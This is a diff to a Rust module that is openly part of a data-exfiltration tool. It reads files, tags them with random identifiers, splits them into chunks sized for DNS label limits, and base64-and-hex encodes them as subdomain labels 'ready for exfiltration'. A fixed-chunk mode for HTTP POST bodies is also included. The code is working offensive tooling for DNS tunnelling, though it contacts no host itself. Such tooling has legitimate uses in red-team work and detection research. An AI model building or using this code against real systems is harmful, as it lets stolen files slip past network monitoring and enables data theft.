@@ -1,97 +1,238 @@
-//! Encoding utilities for exfiltration payloads.
-//!
-//! This module provides helpers for splitting files into chunks and encoding
-//! those chunks into formats suitable for different exfiltration channels.
-//! Two primary flows are supported:
-//! - Generic base64 -> hex encoding with configurable chunk counts (`b64_encode_file`).
-//! - DNS-safe chunking that ensures each label remains within DNS length limits
-//!   and produces base64-then-hex encoded TXT-like segments
-//!   (`dns_safe_b64_encode_payload`).
-//!
-//! The `FileChunk` struct represents an individual chunk of a file with
-//! metadata fields to help ordering and detection of the final chunk.
-
 use core::str;
-use std::path::PathBuf;
+use std::{path::PathBuf, vec};
 
 use base64::Engine;
 
 const DOMAIN_NAME_MAX_LENGTH: usize = 255;
 const DOMAIN_LABEL_MAX_LENGTH: usize = 63;
 
-#[derive(Debug, Clone)]
-/// Represents one chunk of a file prepared for exfiltration.
+/// Represents the root metadata node for a file being exfiltrated.
 ///
-/// Fields:
-/// - `file_name`: the original file name (used to identify which file the chunk belongs to)
-/// - `index`: the zero-based index of the chunk within the file
-/// - `data`: raw chunk bytes
-/// - `is_last_chunk`: internal marker set for the last chunk so receivers know when reassembly is complete
-pub struct FileChunk {
+/// The RootNode contains the original filename and a unique 4-byte identifier
+/// that links all chunks of a file together during reconstruction.
+#[derive(Debug)]
+pub struct RootNode {
+    /// The original filename of the file being exfiltrated.
     pub file_name: String,
-    pub index: usize,
-    pub data: Vec<u8>,
-    is_last_chunk: bool,
+    /// A unique 4-byte identifier shared across all chunks of this file.
+    pub file_identifier: std::rc::Rc<[u8; 4]>,
 }
 
-impl FileChunk {
-    /// Create a new `FileChunk` from the given file name, index and raw bytes.
+impl RootNode {
+    /// Creates a new RootNode with a randomly generated file identifier.
     ///
-    /// The returned chunk has `is_last_chunk` set to `false`; callers that compose
-    /// a sequence of chunks should mark the last chunk as such (the module helpers
-    /// do this automatically).
-    pub fn new(file_name: String, index: usize, data: Vec<u8>) -> Self {
+    /// # Arguments
+    /// * `file_name` - The original filename to associate with this root node.
+    ///
+    /// # Returns
+    /// A new RootNode instance with a random 4-byte file identifier.
+    pub fn new(file_name: String) -> Self {
         Self {
             file_name,
-            index,
-            data,
-            is_last_chunk: false,
+            file_identifier: std::rc::Rc::new(urandom::new().random_bytes()),
         }
     }
 
-    /// Encode only the chunk's raw data as base64 and then hex-encode the base64
-    /// string bytes.
+    /// Returns the node type character identifier for root nodes.
     ///
-    /// This produces an ASCII-safe hex representation of the base64 encoding of
-    /// the chunk bytes (i.e. base64 -> hex). The result is suitable for use
-    /// in transports that expect hexadecimal payloads or where delimiters are
-    /// convenient for reassembly.
-    pub fn encode_data(&self) -> String {
-        hex::encode(base64::prelude::BASE64_STANDARD.encode(&self.data))
-    }
-
-    /// Convert the entire chunk (including file name, index and end marker)
-    /// into the same base64->hex encoded representation used by other helpers.
-    ///
-    /// The chunk is first formatted as "<file_name>:<index>:<encoded_data>[:end]"
-    /// where `:end` is appended when `is_last_chunk` is true. That string is then
-    /// base64-encoded and hex-encoded.
-    pub fn encode_chunk(&self) -> String {
-        b64_hex_encode_string(self.into())
+    /// # Returns
+    /// The character 'r' to identify this as a root node.
+    pub fn node_type(&self) -> char {
+        'r'
     }
 }
 
-impl Into<String> for &FileChunk {
-    /// Convert the `FileChunk` into a colon-separated string containing the file
-    /// name, chunk index, base64-then-hex encoded data and an optional `:end`
-    /// suffix for the last chunk.
-    fn into(self) -> String {
-        format!(
-            "{}:{}:{}{}",
+impl TryFrom<&PathBuf> for RootNode {
+    type Error = std::io::Error;
+
+    /// Attempts to create a RootNode from a file path.
+    ///
+    /// Extracts the filename component from the provided path and creates
+    /// a RootNode with it. Returns an error if no filename can be extracted.
+    fn try_from(value: &PathBuf) -> Result<Self, Self::Error> {
+        if let Some(file_name) = value.file_name() {
+            Ok(Self::new(file_name.to_string_lossy().to_string()))
+        } else {
+            Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "Invalid file path: no file name found",
+            ))
+        }
+    }
+}
+
+impl std::fmt::Display for RootNode {
+    /// Formats the RootNode as a string in the format: `r:filename:hexidentifier`
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(
+            f,
+            "{}:{}:{}",
+            self.node_type(),
             self.file_name,
-            self.index,
-            self.encode_data(),
-            if self.is_last_chunk { ":end" } else { "" }
+            hex::encode(&*self.file_identifier)
         )
     }
 }
 
-/// Compute the approximate number of characters produced by base64 encoding a
-/// binary field of the given length.
+/// Categorizes the type of data chunk in a file transmission.
+#[derive(Debug)]
+enum ChunkType {
+    /// A regular file data chunk.
+    File,
+    /// The final chunk marking the end of file transmission.
+    End,
+}
+
+impl Default for ChunkType {
+    /// Default chunk type is File.
+    fn default() -> Self {
+        ChunkType::File
+    }
+}
+
+/// Represents a chunk of file data being exfiltrated.
 ///
-/// This uses a standard calculation accounting for 4 output chars per 3 input
-/// bytes plus padding. The function returns a floating point estimate which
-/// is used by the chunk-sizing heuristics.
+/// FileChunkNode contains a portion of the file payload along with metadata
+/// needed to reconstruct the file (root node identifier, chunk index, and chunk type).
+#[derive(Debug, Default)]
+pub struct FileChunkNode {
+    /// Hexadecimal-encoded identifier linking this chunk to its root node.
+    pub root_node_id: String,
+    /// The sequential index of this chunk within the file.
+    pub index: usize,
+    /// The raw file data bytes in this chunk.
+    data: Vec<u8>,
+    /// The type of chunk (File or End).
+    chunk_type: ChunkType,
+}
+
+impl FileChunkNode {
+    /// Creates a new FileChunkNode with the specified metadata and data.
+    ///
+    /// # Arguments
+    /// * `root_node_id` - The root node identifier linking this chunk to the file.
+    /// * `index` - The sequential index of this chunk.
+    /// * `data` - The file data bytes for this chunk.
+    ///
+    /// # Returns
+    /// A new FileChunkNode instance.
+    pub fn new(root_node_id: std::rc::Rc<[u8; 4]>, index: usize, data: Vec<u8>) -> Self {
+        Self {
+            root_node_id: hex::encode(&*root_node_id),
+            index,
+            data,
+            chunk_type: ChunkType::File,
+        }
+    }
+
+    /// Appends additional data to this chunk.
+    ///
+    /// # Arguments
+    /// * `more_data` - Additional file data bytes to append.
+    pub fn extend_data(&mut self, more_data: Vec<u8>) {
+        self.data.extend(more_data);
+    }
+
+    /// Marks this chunk as the final chunk of the file.
+    pub fn set_last_chunk(&mut self) {
+        self.chunk_type = ChunkType::End;
+    }
+
+    /// Sets the chunk index and returns self for method chaining.
+    ///
+    /// # Arguments
+    /// * `index` - The new chunk index.
+    ///
+    /// # Returns
+    /// Self for fluent API usage.
+    pub fn set_index(mut self, index: usize) -> Self {
+        self.index = index;
+
+        return self;
+    }
+
+    /// Sets the root node identifier and returns self for method chaining.
+    ///
+    /// # Arguments
+    /// * `root_node_id` - The raw root node identifier bytes.
+    ///
+    /// # Returns
+    /// Self for fluent API usage.
+    pub fn set_raw_root_node_id(mut self, root_node_id: std::rc::Rc<[u8; 4]>) -> Self {
+        self.root_node_id = hex::encode(&*root_node_id);
+
+        return self;
+    }
+
+    /// Returns the node type character identifier for this chunk.
+    ///
+    /// # Returns
+    /// 'f' for a regular file chunk, 'e' for the final end chunk.
+    pub fn node_type(&self) -> char {
+        match self.chunk_type {
+            ChunkType::File => 'f',
+            ChunkType::End => 'e',
+        }
+    }
+}
+
+impl std::fmt::Display for FileChunkNode {
+    /// Formats the FileChunkNode as a string in the format: `type:rootid:index:hexdata`
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(
+            f,
+            "{}:{}:{:X}:{}",
+            self.node_type(),
+            self.root_node_id,
+            self.index,
+            hex::encode(&self.data),
+        )
+    }
+}
+
+/// Represents a node in the file exfiltration tree.
+///
+/// A Node can be either a root metadata node or a file chunk data node.
+#[derive(Debug)]
+pub enum Node {
+    /// The root metadata node containing file information.
+    Root(RootNode),
+    /// A file chunk data node containing portion of the file.
+    FileChunk(FileChunkNode),
+}
+
+impl Node {
+    /// Returns the node type character identifier.
+    ///
+    /// # Returns
+    /// The character representing this node's type ('r', 'f', or 'e').
+    pub fn node_type(&self) -> char {
+        match self {
+            Self::Root(root) => root.node_type(),
+            Self::FileChunk(file_chunk) => file_chunk.node_type(),
+        }
+    }
+}
+
+impl std::fmt::Display for Node {
+    /// Formats the Node by delegating to the appropriate variant's Display implementation.
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Node::Root(root) => std::fmt::Display::fmt(root, f),
+            Node::FileChunk(file_chunk) => std::fmt::Display::fmt(file_chunk, f),
+        }
+    }
+}
+
+/// Calculates the size expansion ratio when base64 encoding data.
+///
+/// Base64 encoding expands data by approximately 33% plus padding overhead.
+///
+/// # Arguments
+/// * `chunk_size` - The size of the raw data chunk in bytes.
+///
+/// # Returns
+/// The estimated size of the base64-encoded output in bytes.
 fn compute_chunk_size_base64_encoding_ratio(chunk_size: f32) -> f32 {
     // https://crypto.stackexchange.com/questions/83952/how-do-i-calculate-base64-conversion-rate
     let base64_chacacters = 4.0 * (chunk_size as f32 / 3.0);
@@ -100,17 +241,18 @@ fn compute_chunk_size_base64_encoding_ratio(chunk_size: f32) -> f32 {
     return base64_chacacters + padding;
 }
 
-/// Compute an optimal raw chunk size (in bytes) for payloads that will be
-/// base64-encoded and then hex-encoded and transported inside DNS labels.
+/// Recursively computes the optimal chunk size for DNS-safe payload encoding.
 ///
-/// The function takes into account:
-/// - the payload length to split,
-/// - the domain name length (which affects how much of a DNS name can be used),
-/// - an optional padding adjustment used by the recursive algorithm.
+/// Balances payload size against domain name constraints to ensure encoded chunks
+/// fit within DNS label length limits (63 bytes) when base64 and hex encoded.
 ///
-/// The result is the maximum number of raw bytes per chunk such that the final
-/// hex(base64(payload_chunk)) will fit within a DNS label boundary.
-/// This is computed recursively increasing padding until the encoded size fits.
+/// # Arguments
+/// * `payload_length` - Total length of the file data to encode.
+/// * `domain_length` - Length of the target domain name.
+/// * `padding` - Optional padding to apply for constraint solving.
+///
+/// # Returns
+/// The optimal chunk size in bytes that fits DNS constraints.
 fn compute_optimal_hex_base64_chunk_size(
     payload_length: usize,
     domain_length: usize,
@@ -134,55 +276,24 @@ fn compute_optimal_hex_base64_chunk_size(
     compute_optimal_hex_base64_chunk_size(payload_length, domain_length, Some(op_padding + 1))
 }
 
-/// Helper that base64-encodes the given string bytes and then hex-encodes the
-/// resulting base64 string bytes.
+/// Encodes a string using base64 then hex encoding.
 ///
-/// This is the canonical encoding used throughout the module: produce base64
-/// representation of some textual content (or already-encoded chunk) and then
-/// hex-encode the base64 text so the result is ASCII-hex bytes (0-9a-f).
+/// # Arguments
+/// * `string` - The input string to encode.
+///
+/// # Returns
+/// A hex-encoded string of the base64-encoded input.
 fn b64_hex_encode_string(string: String) -> String {
     hex::encode(base64::prelude::BASE64_STANDARD.encode(string.as_bytes()))
 }
 
-/// Apply the canonical base64->hex encoding to each `FileChunk`'s data payload.
+/// Reads an entire file into memory as bytes.
 ///
-/// The input is a vector of `FileChunk`s; the returned vector contains the
-/// encoded string for each chunk in the same order and is suitable to be
-/// transmitted directly by the exfiltration logic.
-fn b64_encode_segmented_payload(splitted_payload: Vec<FileChunk>) -> Vec<String> {
-    splitted_payload
-        .iter()
-        .map(FileChunk::encode_chunk)
-        .collect()
-}
-
-/// Split a textual file content into `FileChunk`s by a specified raw byte chunk size.
+/// # Arguments
+/// * `filepath` - Path to the file to read.
 ///
-/// The `file_content` is read as a string; its bytes are sliced into chunks of
-/// `chunk_size` and wrapped into `FileChunk` structs with increasing indices.
-/// The last chunk is marked with `is_last_chunk = true`.
-fn split_file_content(file_name: &str, file_content: String, chunk_size: usize) -> Vec<FileChunk> {
-    let file_bytes = file_content.bytes().collect::<Vec<u8>>();
-
-    let mut file_chunks = file_bytes
-        .chunks(chunk_size)
-        .enumerate()
-        .map(|(index, chunk)| FileChunk::new(file_name.to_string(), index, chunk.to_vec()))
-        .collect::<Vec<FileChunk>>();
-
-    file_chunks
-        .last_mut()
-        .map(|last_chunk| last_chunk.is_last_chunk = true);
-
-    return file_chunks;
-}
-
-/// Read the contents of a file into a vector of bytes using buffered string read.
-///
-/// This helper reads the file to a string (using `read_to_string`) and returns
-/// the underlying bytes. It is convenient for files expected to contain text
-/// data; binary files may still be processed but the intermediate string step
-/// could be suboptimal for large binary blobs.
+/// # Returns
+/// A vector of bytes containing the file contents.
 fn buffered_read_file(filepath: &PathBuf) -> Vec<u8> {
     std::fs::read_to_string(filepath)
         .unwrap()
@@ -190,25 +301,40 @@ fn buffered_read_file(filepath: &PathBuf) -> Vec<u8> {
         .collect::<Vec<u8>>()
 }
 
-/// Split raw file bytes into DNS-safe `FileChunk`s.
+/// Splits file data into DNS-safe chunks with appropriate metadata nodes.
 ///
-/// This function produces chunks that, when prefixed by "<file_name>:<index>:"
-/// and then base64+hex encoded, will still fit within DNS label length limits.
-/// It accepts a `max_chunk_size` (in raw bytes) that will be respected; the
-/// function subtracts the formatting prefix length when taking bytes for each
-/// payload portion, ensuring label safety.
-/// The resulting chunks are returned with the last chunk flagged.
+/// Creates a vector of nodes starting with a root node followed by file chunk nodes,
+/// each sized to fit within DNS constraints when encoded.
+///
+/// # Arguments
+/// * `root_node` - The root metadata node for the file.
+/// * `file_bytes` - The complete file data to split.
+/// * `max_chunk_size` - Maximum size in bytes for each encoded chunk.
+///
+/// # Returns
+/// A vector of Node objects representing the file structure.
 fn dns_safe_split_file_bytes(
-    file_name: String,
+    root_node: RootNode,
     file_bytes: Vec<u8>,
     max_chunk_size: usize,
-) -> Vec<FileChunk> {
+) -> Vec<Node> {
+    let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
+    let mut nodes: Vec<Node> = vec![Node::Root(root_node)];
     let mut payload_iterable = file_bytes.into_iter();
-    let mut index: usize = 0;
-    let mut chunks: Vec<FileChunk> = Vec::new();
+    let mut index: usize = 1;
 
     loop {
-        let buffer_length = format!("{}:{}:", file_name, index).len();
+        let mut file_chunk_node = FileChunkNode::default()
+            .set_index(index)
+            .set_raw_root_node_id(std::rc::Rc::clone(&ref_root_identifier));
+
+        let buffer_length = format!(
+            "{}:{}:{:X}:",
+            file_chunk_node.node_type(),
+            file_chunk_node.root_node_id,
+            index
+        )
+        .len();
         let file_bytes_portion = payload_iterable
             .by_ref()
             .take(max_chunk_size - buffer_length)
@@ -217,55 +343,90 @@ fn dns_safe_split_file_bytes(
         if file_bytes_portion.is_empty() {
             break;
         }
+        file_chunk_node.extend_data(file_bytes_portion);
+        nodes.push(Node::FileChunk(file_chunk_node));
 
-        chunks.push(FileChunk::new(
-            file_name.to_string(),
-            index,
-            file_bytes_portion,
-        ));
-
-        index += 1
+        index += 1;
     }
 
-    chunks
-        .last_mut()
-        .map(|last_chunk| last_chunk.is_last_chunk = true);
+    nodes.last_mut().map(|last_node| {
+        if let Node::FileChunk(chunk_node) = last_node {
+            chunk_node.set_last_chunk();
+        }
+    });
 
-    return chunks;
+    return nodes;
 }
 
-/// Produce a vector of base64->hex encoded payload segments that are DNS-safe.
+/// Encodes a file for DNS exfiltration with base64 and hex encoding.
 ///
-/// The function reads the file bytes, computes an appropriate chunk size based
-/// on the `domain_name` length and DNS label limits, splits the bytes into
-/// DNS-safe chunks and returns an encoded string for each chunk. The returned
-/// segments are suitable to be used as DNS labels or parts of DNS queries.
+/// Splits the file into DNS-safe chunks sized to fit within domain constraints,
+/// encodes them with base64 and hex, then formats as DNS-compatible labels.
+///
+/// # Arguments
+/// * `filepath` - Path to the file to encode.
+/// * `domain_name` - The target domain name for sizing constraints.
+///
+/// # Returns
+/// A vector of encoded DNS subdomain labels ready for exfiltration.
 pub fn dns_safe_b64_encode_payload(filepath: &PathBuf, domain_name: &str) -> Vec<String> {
     let file_bytes = buffered_read_file(filepath);
     let max_chunk_size =
         compute_optimal_hex_base64_chunk_size(file_bytes.len(), domain_name.len(), None);
-    let file_name = filepath.file_name().unwrap().to_string_lossy();
+    let root_node = RootNode::try_from(filepath).unwrap();
+    let nodes = dns_safe_split_file_bytes(root_node, file_bytes, max_chunk_size);
 
-    return b64_encode_segmented_payload(dns_safe_split_file_bytes(
-        file_name.to_string(),
-        file_bytes,
-        max_chunk_size,
-    ));
+    nodes
+        .iter()
+        .map(|node| {
+            b64_hex_encode_string(node.to_string())
+                .as_bytes()
+                .chunks(max_chunk_size)
+                .filter_map(|byte| str::from_utf8(byte).ok())
+                .collect::<Vec<&str>>()
+                .join(".")
+        })
+        .collect()
 }
 
-/// Split the file into `chunks` logical parts, base64-then-hex encode each part,
-/// and return the vector of encoded payload strings.
+/// Encodes a file using base64 and hex with a fixed number of chunks.
 ///
-/// This function is intended for transports that don't have label-length
-/// restrictions (for example HTTP POST bodies). The `chunks` parameter controls
-/// how many roughly-equal pieces the file is divided into.
+/// Splits the file into a specified number of chunks, creates nodes for each,
+/// and encodes them with base64 and hex.
+///
+/// # Arguments
+/// * `filepath` - Path to the file to encode.
+/// * `chunks` - The number of chunks to divide the file into.
+///
+/// # Returns
+/// A vector of base64+hex encoded strings, one per node.
 pub fn b64_encode_file(filepath: &PathBuf, chunks: usize) -> Vec<String> {
-    let file_content = std::fs::read_to_string(filepath).unwrap();
-    let chunk_size = file_content.len().div_ceil(chunks);
+    let root_node = RootNode::try_from(filepath).unwrap();
+    let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
+    let mut nodes = vec![Node::Root(root_node)];
+    let file_content = buffered_read_file(filepath);
 
-    b64_encode_segmented_payload(split_file_content(
-        &filepath.file_name().unwrap().to_string_lossy(),
-        file_content,
-        chunk_size,
-    ))
+    nodes.extend(
+        file_content
+            .chunks(file_content.len().div_ceil(chunks))
+            .enumerate()
+            .map(|(index, chunk)| {
+                Node::FileChunk(FileChunkNode::new(
+                    std::rc::Rc::clone(&ref_root_identifier),
+                    index,
+                    chunk.to_vec(),
+                ))
+            }),
+    );
+
+    nodes.last_mut().map(|last_node| {
+        if let Node::FileChunk(chunk_node) = last_node {
+            chunk_node.set_last_chunk();
+        }
+    });
+
+    nodes
+        .iter()
+        .map(|node| b64_hex_encode_string(node.to_string()))
+        .collect()
 }
